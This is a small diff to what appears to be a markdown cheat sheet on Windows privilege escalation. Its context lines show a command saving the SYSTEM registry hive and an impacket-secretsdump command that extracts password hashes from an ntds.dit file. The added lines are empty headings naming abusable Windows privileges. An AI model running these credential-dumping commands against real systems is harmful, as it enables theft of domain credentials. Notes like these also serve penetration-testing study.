@@ -148,3 +148,11 @@ reg save hklm\system c:\temp\system.bak
 
 Secretsdump
 	`impacket-secretsdump -system system -ntds ntds.dit local
+
+
+
+## SeTakeOwnershipPrivilege
+
+## SeRestorePrivilege
+## SeLoadDriverPrivilege
+## SeCreateTokenPrivilege
